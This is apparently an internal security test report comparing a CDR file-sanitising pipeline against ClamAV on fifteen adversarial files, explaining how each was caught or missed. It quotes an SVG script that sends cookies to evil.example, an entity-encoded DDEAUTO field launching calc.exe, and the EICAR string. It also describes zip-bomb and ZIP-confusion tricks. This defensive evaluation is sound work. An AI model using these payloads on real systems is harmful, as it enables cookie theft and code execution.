# CDR vs ClamAV — Adversarial Corpus Data Point

**Date:** 2026-06-22
**Corpus:** `docs/test-corpus/adversarial/` (15 files)
**CDR engine:** `src/lambda_function.py` (run via the `handler()` entry point with mocked S3/SNS — no AWS, no network, no payload execution)
**AV engine:** ClamAV 1.5.2, signature DB 28039 (daily) / 63 (main) / 339 (bytecode), 3,627,878 known signatures

This is an empirical data point comparing a **structural Content Disarm & Reconstruction** gate against a **signature antivirus** engine on the same adversarial inputs. It exists to answer one question with evidence rather than assertion: *is signature AV sufficient, and what does CDR cover that it does not?*

---

## TL;DR

| Engine | Files flagged / handled as threats | Files passed as "OK" |
|---|---|---|
| **ClamAV** (signature) | **1 / 15** (only `eicar.zip`) | 14 / 15 |
| **CDR** (structural) | **14 / 15** rejected, quarantined, or stripped | 1 / 15 (a true polyglot edge case, discussed below) |

**The two engines are near-complementary, not redundant.** ClamAV caught exactly one file — the EICAR *test marker* deliberately planted to prove the scanner is wired up. It matched **none** of the real exploit-class samples (`cve-2017-1182.xls`, `.rtf`), spyware PDFs, macro/DDE documents, ZIP-structure attacks, or the decompression bomb. CDR neutralised or rejected all of those on structure, but is blind to byte-signature malware (it would have passed EICAR-in-a-`.docx` straight through if the structure were clean).

**Conclusion:** neither engine alone is a sufficient gate. The production architecture runs them in parallel and aggregates — this corpus is concrete justification for that design, not an argument that either can be dropped.

---

## Method

Each file was fed to the CDR Lambda's `handler()` with an in-memory fake S3 (`get/put/delete/copy_object`) and a mocked SNS publish. The handler's real control flow ran unmodified: pre-download size guard → format dispatch → ZIP structural validation → CDR → upload to `sanitised/` (or quarantine) → source delete → result publish. No file content was executed; CDR only *parses structure and removes objects* — it never interprets a macro, runs JavaScript, or detonates a payload.

ClamAV was run with `clamscan --recursive` over the same directory.

**Attribution of content-level claims.** The CDR pipeline's verdict for any file is *only* its `handler()` return (`status` + `reason`) plus the object tags and SNS payload it writes — e.g. for a legacy `.xls` the entire verdict is `{"status": "unsupported-format", "reason": "OLE binary format not supported"}`, decided from the **extension alone, before the file is opened**. Any statement in this doc about a file's *contents* — VBA module counts, macro names, "benign" vs "malicious", presence/absence of `Auto_Open`, obfuscation, embedded payloads — comes from **out-of-band forensic tooling** (`file`, `oletools.olevba`, `pikepdf`, manual XML inspection) run separately to explain *why* the corpus file is adversarial. Those are the author's observations, **not** anything the gateway computed or asserted. Where this distinction matters most (the macro `.xls`, #3b), the gateway explicitly does **not** evaluate macro intent.

**Disposition vocabulary (CDR):**

| Disposition | Meaning | Source bucket | Lands in `sanitised/`? |
|---|---|---|---|
| `sanitised` | Active content stripped (or none found); reconstructed clean copy emitted | deleted | **yes** |
| `rejected` | ZIP structural hard-reject; input is unprocessable-by-construction | deleted | no — `rejected/` quarantine |
| `unsupported-format` | Format fails closed by policy (legacy OLE, RTF, unknown ext) | deleted | no — `unsupported/` quarantine |
| `error` → `raise` | CDR began but a guard tripped mid-parse; re-raised for EventBridge retry → DLQ | **preserved** | no — `error/` quarantine |

The reason `error` preserves the source while `rejected`/`unsupported` delete it: a hard-reject or policy-reject is a *definitive* verdict on unprocessable/disallowed input, so deleting the source stops EventBridge re-triggering forever. An `error` might be transient, so the source is kept for retry/investigation and the re-raise routes it to the alarmed DLQ (pitfall #36).

---

## Results matrix

| # | File | Adversarial mechanism | CDR disposition | CDR action | ClamAV |
|---|---|---|---|---|---|
| 1 | `eicar.zip` | EICAR AV-test string inside a `.zip` | `unsupported-format` | fail closed on unknown ext `zip` | **Eicar-Test-Signature FOUND** |
| 2 | `xss.svg` | SVG `onload=` + `<script>` cookie exfil | `unsupported-format` | fail closed on unknown ext `svg` | OK |
| 3 | `cve-2017-1182_legacy OLE binary.xls` | Legacy OLE Excel exploit (CVE-2017-1182) | `unsupported-format` | legacy OLE → quarantine, no CDR | OK |
| 3b | `Excel with VBA Macros.xls` | Legacy OLE Excel with ~30 VBA modules (externally assessed as benign automation — *not* a gateway judgment) | `unsupported-format` | legacy OLE → quarantine, no CDR (intent not evaluated) | OK |
| 4 | `cve-2017-1182_RichTextFormat.rtf` | RTF OLE/remote-template exploit class | `unsupported-format` | RTF fail-closed by design | OK |
| 5 | `duplicate_entry.docx` | Two ZIP entries named `word/document.xml` | `rejected` | ZIP hard-reject (duplicate entry) | OK |
| 6 | `nonstandard_compression.docx` | Local compression method `99` vs central `8` | `rejected` | ZIP hard-reject (method mismatch) | OK |
| 7 | `falsified_filesize.docx` | Central-dir `file_size` lies about real content | `error` → raise | CRC guard trips, quarantined to `error/` | OK |
| 8 | `zipbomb.docx` | `word/document.xml` decompresses past 200 MB | `error` → raise | decompression-limit guard trips | OK |
| 9 | `nested_macro_embeddings.xlsx` | `.docm` + OLE object embedded in xlsx | `sanitised` | both embedded parts stripped | OK |
| 10 | `entity_encoded_dde.docx` | `&#68;&#68;&#69;…` (entity-encoded `DDEAUTO …calc.exe`) | `sanitised` | entity-encoded field code neutralised | OK |
| 11 | `aware-spyware-ticket-260622.pdf` | PDF `/OpenAction` + 3 annot actions + XMP metadata | `sanitised` | 5 objects stripped | OK |
| 12 | `aware-spyware-Bonifico.pdf` | PDF annotation action | `sanitised` | 1 annot `/A` stripped | OK |
| 13 | `aware-spyware-May 2026.pdf` | PDF (no active content found) | `sanitised` | re-encoded, 0 removals | OK |
| 14 | `pdf_zip_polyglot.pdf` | Valid PDF **and** valid ZIP (polyglot) | `sanitised` | parsed as PDF, 0 removals | OK |

**Score:** CDR neutralised/rejected 14 of 15; the remaining one (`pdf_zip_polyglot.pdf`) is a genuine edge case examined in detail below. ClamAV flagged 1 of 15.

---

## Per-file analysis — why each file is adversarial, how CDR detects and handles it

### 1. `eicar.zip` — the AV-layer control marker

**Threat.** Contains `eicar.com`, the EICAR standard antivirus test string (`X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`). It is *not* malware — it is a planted marker that every signature engine is built to recognise, used to prove the AV path is live and reading file bytes.

**CDR.** A `.zip` extension is **not** a handled Office/PDF/image type, so the unknown-extension gate fails it closed: `unsupported-format`, quarantined to `unsupported/`, source deleted. CDR never looks at the EICAR bytes — it rejects on extension policy first.

**ClamAV.** `Eicar-Test-Signature FOUND`. This is the *one* file ClamAV caught, and it caught it because it is the textbook thing signature AV is for.

**Lesson.** This file proves both layers are wired correctly: ClamAV's signature path fires, and CDR's fail-closed gate fires — for *different reasons*, on the *same* file. It is the calibration point for the whole comparison.

---

### 2. `xss.svg` — active-content carrier masquerading as an image

**Threat.** `<svg … onload="alert(document.domain)"><script>fetch("https://evil.example/"+document.cookie)</script>…</svg>`. SVG is XML with a full scripting surface; rendered in a browser context it runs the `onload` handler and the `<script>` (here, cookie exfiltration). It is an "image" by extension only.

**CDR.** SVG is not in the handled-image set (`jpg/jpeg/png/gif/bmp/tiff/webp`) — those go through Pillow pixel re-encode, which SVG cannot. So it fails closed: `unsupported-format`, quarantined, source deleted. CDR refuses to label content it cannot disarm as `sanitised` (pitfall #28). The passthrough metric still fires for detection.

**ClamAV.** OK — no signature for this inline XSS.

**Lesson.** A denylist gate ("strip what I know, pass the rest") would have laundered this into the trusted bucket. The allowlist posture is what stops it.

---

### 3. `cve-2017-1182_legacy OLE binary.xls` — legacy OLE exploit

**Threat.** A real CVE-2017-1182 Excel sample. Magic `D0 CF 11 E0` — an OLE/Compound File Binary, the pre-OOXML `.xls` format. The exploit lives in malformed OLE stream structure that a forgiving Excel parser mishandles.

**CDR.** `xls ∈ LEGACY_EXTS {doc, ppt, xls}`. The legacy-format branch runs *before* any parsing: quarantine to `unsupported/`, publish `unsupported-format`, delete source. **No CDR is attempted.** OLE binaries cannot be surgically disarmed — the danger is parser divergence, not an excisable object (same root cause as RTF, #38).

**ClamAV.** OK — this specific sample is below the public signature DB's radar.

**Lesson.** A real, named CVE exploit that signature AV waved through. CDR stops it on format policy, not on recognising the exploit — which is exactly why policy-based fail-closed beats signature-matching for this class.

---

### 3b. `Excel with VBA Macros.xls` — macro-laden legacy OLE (policy, not intent)

**Threat (per out-of-band inspection — see "Attribution" above).** A legacy OLE `.xls` (`D0 CF 11 E0`) containing roughly **30 VBA modules**, confirmed via `oletools.olevba` (`detect_vba_macros() == True`). Unlike #3, this is not a known exploit: the macro code reads as ordinary business automation — hide/show rows, unit conversion (`Ft_To_Mtrs`/`Mtrs_To_Ft`), print routines, and `ExportAsFixedFormat … xlTypePDF`, with no `Auto_Open`/`Workbook_Open` auto-execute, no obfuscation, and no `Shell`-to-payload. **This "benign automation" reading is the author's, from olevba — the gateway computed none of it** (see below).

**CDR.** The pipeline's *complete* verdict is `{"status": "unsupported-format", "reason": "OLE binary format not supported"}`, with quarantine tags `cdr-status=unsupported-format`, `cdr-original-ext=xls`. It reached this from `xls ∈ LEGACY_EXTS` — the legacy branch fires **before the file is opened**, so the pipeline never parsed the OLE streams, never counted modules, never read a line of VBA, and made **no benign/malicious determination whatsoever.** Disposition is byte-for-byte identical to #3 (the CVE exploit): `unsupported-format`, quarantined to `unsupported/`, source deleted.

**ClamAV.** OK.

**Lesson — this is the most instructive case in the corpus.** CDR makes **no attempt to judge whether the macros are malicious.** The legacy OLE *format* is the disqualifier, full stop. This is correct and deliberate for two reasons:

1. **Format, not content, is the risk.** A `.xls` cannot be surgically disarmed (parser divergence, OLE stream complexity), so "are these particular macros safe?" is the wrong question — the gate can't safely answer it for *any* OLE binary, benign or not.
2. **It demonstrates the fail-closed posture is a policy, not a detector.** #3 (a real CVE) and #3b (externally assessed as benign automation) receive the *same* verdict from the *same* code path. The gate does not need to — and does not — distinguish them: it never inspects the macros at all, so "benign" and "malicious" are not categories it computes. Both are legacy OLE; both are refused on format. A gate that tried to pass "benign" macro `.xls` files would have to parse and judge VBA, reintroducing exactly the attack surface the policy avoids.

The operational consequence: a macro workbook like this — even one a human analyst would call legitimate — will be **quarantined, not delivered**. That is the intended trade-off. If such files must flow through, the answer is out-of-band conversion (xls → xlsx with macros dropped, or → PDF) in a sandbox, then CDR the result — never in-pipeline reconstruction of the OLE binary. (Contrast with ClamAV, which also said OK here — but for the opposite reason: it found no *signature*, which would equally have let a *malicious* macro `.xls` through.)

---

### 4. `cve-2017-1182_RichTextFormat.rtf` — RTF parser-divergence exploit

**Threat.** RTF carrier for the CVE-2017-1182 class. RTF danger is structural: embedded/linked OLE (`\object`, `\objupdate`), remote-template references, and control words a forgiving consumer acts on. The grammar Word parses diverges from any grammar a sanitiser could re-parse.

**CDR.** `rtf ∈ FAIL_CLOSED_EXTS`. A dedicated block runs **before** ZIP validation and the unknown-ext gate, so the rejection is order-independent (even a mistaken add to `OFFICE_EXTS` cannot route it to `cdr_office()`). Result: `unsupported-format`, reason `format rejected by design: rtf`, quarantined, source deleted. RTF is **never** given a CDR handler — the correct posture is fail-closed quarantine, not a `\obj`→`\0bj` denylist bet (pitfall #38).

**ClamAV.** OK.

**Lesson.** The companion to the `.xls` case: two real exploit samples, both invisible to signature AV, both stopped by CDR policy.

---

### 5. `duplicate_entry.docx` — ZIP duplicate-entry confusion

**Threat.** Two ZIP entries both named `word/document.xml`. Different ZIP readers resolve the collision differently (first vs last wins) — a scanner may inspect one copy while Word opens the other, smuggling content past inspection.

**CDR.** `_validate_zip_structure` walks the central directory, collects entry names, and hard-rejects on the first duplicate: `rejected`, reason `duplicate ZIP entry: 'word/document.xml'`, quarantined to `rejected/`, source deleted, `CDR/Validation/ZipAnomalies` metric emitted. There is **no** "log and proceed" path for structural anomalies (pitfall #14).

**ClamAV.** OK — a structural ambiguity, not a byte signature.

**Lesson.** Parser-differential attacks are invisible to content signatures and are precisely what structural validation exists to catch.

---

### 6. `nonstandard_compression.docx` — local/central method mismatch

**Threat.** The central directory declares deflate (method `8`) for `[Content_Types].xml` while the local file header declares method `99` (AES/unknown). A reader trusting one header reads different bytes than a reader trusting the other — another differential-parsing smuggle.

**CDR.** `_validate_zip_structure` reads the raw local-header method bytes and compares to the central-directory `compress_type`; mismatch → hard reject: `rejected`, reason `compression method mismatch on '[Content_Types].xml': local=99 central=8`, quarantined, source deleted, anomaly metric emitted.

**ClamAV.** OK.

**Lesson.** Same family as #5. The validator checks *both* directories agree, not just that the file opens.

---

### 7. `falsified_filesize.docx` — lying central-directory `file_size`

**Threat.** The central-directory `file_size` field is falsified (e.g. claims 1 byte) while the entry actually decompresses to far more — a classic decompression-bomb evasion that defeats any guard trusting the declared size.

**CDR.** CDR **never trusts `item.file_size`** (pitfall #2). `_read_zip_entry_safe` reads in 64 KB chunks with an independent running byte counter. Here Python's `zipfile` CRC check tripped first (`Bad CRC-32 for file 'word/document.xml'`) because the falsified metadata also breaks the CRC. CDR raises, the handler quarantines to `error/`, publishes `error`, and **re-raises** — routing to EventBridge retry → DLQ. Source preserved (the error may be transient; pitfall #36).

**ClamAV.** OK.

**Lesson.** Note the disposition difference from #5/#6: a *lying-metadata* file trips mid-parse (`error`, source kept), whereas a *structurally-invalid* file is rejected pre-parse (`rejected`, source deleted). Both are quarantined; neither reaches `sanitised/`.

---

### 8. `zipbomb.docx` — decompression bomb

**Threat.** `word/document.xml` is a small deflate stream that expands past the 200 MB per-entry limit (`_MAX_ENTRY_BYTES`). A compressed upload well under the 100 MB pre-download guard (`_MAX_FILE_BYTES`) can expand to multiple GB and OOM-crash an unguarded reader, creating an EventBridge retry loop that drains reserved concurrency — a remote upload-only DoS.

**CDR.** The chunked counter in `_read_zip_entry_safe` accumulates decompressed bytes and raises the moment the running total exceeds the limit: `ZIP entry 'word/document.xml' exceeds decompression limit 209715200` — *before* the full payload is buffered. Quarantined to `error/`, `error` published, re-raised to the DLQ. This guard is independent of CRC and of `file_size` and must stay even if `BadZipFile` would catch most tampered ZIPs (pitfall #8, #2).

**ClamAV.** OK in 11 s — ClamAV did not flag the bomb. (ClamAV has its own internal scan limits, but it does not surface this as a detection.)

**Lesson.** Availability is a security property. The decompression guard is the layer protecting it, and it is a CDR concern, not an AV one.

---

### 9. `nested_macro_embeddings.xlsx` — macro/OLE smuggled via embedding

**Threat.** A structurally-clean `.xlsx` that embeds active payloads as parts: `xl/embeddings/nested_macro.docm` (a macro-enabled Word doc) and `xl/embeddings/oleObject1.bin` (an OLE object). The outer workbook has no macros itself — the payload rides inside `embeddings/`. A gate that only checks the top-level format passes it.

**CDR.** `cdr_office()` iterates the archive and drops embedded OLE/package parts under `word|xl|ppt/embeddings/` by name — stripping the **part bytes**, not just a relationship (pitfall #31). Result: `sanitised`, removed = `['xl/embeddings/nested_macro.docm', 'xl/embeddings/oleObject1.bin']`. The clean workbook structure is preserved and re-emitted.

**ClamAV.** OK — it did not flag the embedded `.docm`/OLE payload.

**Lesson.** "Clean outer format, dangerous inner part" is the embedding-smuggle pattern. CDR strips the payload bytes; signature AV missed it.

---

### 10. `entity_encoded_dde.docx` — obfuscated DDE via XML entities

**Threat.** `<w:instrText> &#68;&#68;&#69;&#65;&#85;&#84;&#79; c:\windows\system32\calc.exe </w:instrText>` — the numeric character references decode to `DDEAUTO`, a Dynamic Data Exchange auto-execute field that launches `calc.exe`. Word entity-decodes before evaluating the field, so the raw bytes never literally spell `DDEAUTO` — defeating a naive substring scan. The same document contains `AT&amp;T` as legitimate text that must survive.

**CDR.** `_neutralise_encoded_field_codes` matches runs of ASCII letters and numeric character references containing at least one `&#…;`, `html.unescape()`s **just that run** for the keyword check, and replaces the whole run with `_CDR_REMOVED_` if it decodes to a dangerous keyword. Critically it does **not** `html.unescape()` the whole part — that would corrupt `AT&amp;T` → `AT&T` and produce invalid XML (pitfall #21). Result: `sanitised`, removed = `['word/document.xml: 1 entity-encoded field code(s)']`; the benign `AT&amp;T` survives byte-for-byte.

**ClamAV.** OK — no signature for entity-encoded DDE.

**Lesson.** Obfuscation that defeats substring matching is defeated by *semantic* neutralisation. And the false-positive guard (`AT&amp;T` preserved) matters as much as the catch — over-stripping corrupts legitimate documents (pitfall #21, #40).

---

### 11. `aware-spyware-ticket-260622.pdf` — multi-vector active PDF

**Threat.** A real spyware-themed PDF carrying a document-open trigger (`/OpenAction`), three annotation actions (`/A` on `/Link` annots — the clickable URI targets), and an XMP `/Metadata` stream (tracking/fingerprint surface).

**CDR.** `cdr_pdf()` (pikepdf) removes catalog `/OpenAction`, deletes **every** `/A`/`/AA` on page annotations unconditionally (denylist-free — catches `/GoToE`, `/Launch`, `/URI`, etc. an allowlist would miss; pitfall #31), and drops `/Metadata`. Result: `sanitised`, removed = `['/OpenAction', 'page[0] annot/A' ×3, '/Metadata']`. Verified at the raw-object level: post-CDR the normalised PDF contains **0** `/OpenAction`, **0** `/A`, **0** `/URI`; the three `/Link` annotations remain as inert visible structure.

**ClamAV.** OK.

**Lesson.** PDF active content is CDR's home turf — and the unconditional `/A`/`/AA` deletion is broader than any action-allowlist scanner.

---

### 12. `aware-spyware-Bonifico.pdf` — single-vector active PDF

**Threat.** Same spyware family; carries one annotation `/A` action. (Byte-identical to a sample also seen as `5a2c…d8a6.pdf` — same payload, two names.)

**CDR.** `sanitised`, removed = `['page[0] annot/A']`. The action is gone; structure preserved.

**ClamAV.** OK.

---

### 13. `aware-spyware-May 2026.pdf` — no active content found

**Threat.** Spyware-themed PDF, but on inspection it carries no `/OpenAction`, `/JavaScript`, embedded files, or annotation actions that CDR targets.

**CDR.** `sanitised`, **0 removals** — CDR found nothing to strip and re-emitted the file through pikepdf (a fresh re-encode, which itself normalises object structure).

**ClamAV.** OK.

**Lesson — important caveat.** `0 removals` does **not** mean "proven clean." It means CDR found no *recognised active object*. If the threat were a malformed-stream parser exploit (the CVE-2017-1182 *class*, JBIG2/font bugs), CDR would pass it because there is no active object to remove. This is the boundary of structural CDR and the reason the AV layer (and ideally a multi-engine/behavioural layer) is not optional. Here ClamAV also said OK — so for this specific file, **no layer in this experiment positively cleared it**; it was passed by absence of detection, which is weaker than a positive verdict.

---

### 14. `pdf_zip_polyglot.pdf` — PDF/ZIP polyglot (the genuine edge case)

**Threat.** 696 bytes that are simultaneously a valid PDF (`%PDF-1.3` header) **and** a valid ZIP (`PK\x03\x04` present). A polyglot is interpreted differently by different consumers: a PDF viewer renders the PDF; a ZIP tool extracts the archive. The danger is that the "safe" interpretation a gate inspects is not the interpretation the ultimate consumer uses.

**CDR.** Dispatch is by **extension** — `.pdf` → `cdr_pdf()`. CDR processes the PDF interpretation, finds no active PDF objects, and emits `sanitised` with 0 removals. **CDR does not detect that the same bytes are also a valid ZIP.** This is the one file in the corpus where CDR's disposition is arguably incomplete: the PDF layer is disarmed, but the ZIP interpretation is not examined.

**Is this a real gap?** Partially mitigated, not fully closed:
- The output is a pikepdf **re-encode**, not the original bytes — the trailing/embedded ZIP structure does not survive a clean PDF rewrite intact, so the polyglot is likely broken in the sanitised copy as a side effect.
- But that is incidental, not a designed defence. A polyglot whose ZIP portion survived re-encoding would pass labelled `sanitised`.

**ClamAV.** OK — no signature.

**Lesson — honest limitation.** This is the corpus's reminder that CDR is **extension-and-format-scoped**. It disarms the format it dispatches to; it does not enumerate every grammar a byte stream satisfies. Closing this fully would require content-sniffing for secondary container signatures (a candidate hardening item). Documented here rather than glossed over.

---

## What this data point establishes

1. **Signature AV is near-blind to this threat class.** ClamAV (3.6M signatures) flagged **1/15**, and that one was the planted test marker. Every real exploit sample, macro/DDE document, the ~30-module macro `.xls`, structural attack, embedding-smuggle, and the zip bomb passed it. Signature matching detects *known byte patterns*; almost none of these threats *are* a known byte pattern.

2. **CDR covers the axis AV cannot.** 14/15 were rejected, quarantined, or stripped on **structure and policy** — independent of any signature. The mechanisms (fail-closed extensions, ZIP structural validation, decompression guards, semantic field-code neutralisation, unconditional PDF action stripping, embedded-part removal) target *capability*, not *known-bad-bytes*. And the policy is intent-agnostic by design: the macro `.xls` (#3b, externally assessed benign) and the real CVE `.xls` (#3) get the same fail-closed verdict from the same code path — the gateway never inspects either one's contents to tell them apart.

3. **CDR is not a safety verdict.** Three files exited `sanitised` with 0 removals (#13 PDF, #14 polyglot, and the separately-tested clean CMS template). CDR strips recognised active content; it does not certify a file harmless, and it is format-scoped (#14). A malformed-parser exploit or an unexamined secondary container can pass.

4. **The layers are complementary by design.** The single file ClamAV caught (`eicar.zip`) and the files only CDR caught do not overlap in *why* they were caught. Running both in parallel and aggregating — exactly the production architecture — is the configuration that covers both axes. This corpus is evidence for that design.

### Residual hardening candidates surfaced by this run
- **PDF/ZIP polyglot (#14):** content-sniff for secondary container magic, don't rely on extension-scoped dispatch alone.
- **0-removal passes (#13):** treat "sanitised, 0 removals" as *not positively cleared* downstream; ensure the AV/behavioural layer is the gate of record for those, not CDR.
- **AV engine choice:** public ClamAV added almost no independent signal here. A multi-engine or behavioural malware layer (e.g. GuardDuty Malware Protection) would be a materially stronger second axis than signature ClamAV alone.

---

*Reproduce:* run each file in `docs/test-corpus/adversarial/` through `lambda_function.handler()` with a mocked S3/SNS harness (see the session that produced this doc), and `clamscan --recursive docs/test-corpus/adversarial/`. CDR dispositions above are the literal handler return values; ClamAV results are per-file scan output (`eicar.zip` infected, all others OK). VBA confirmation for #3b via `oletools.olevba`.*
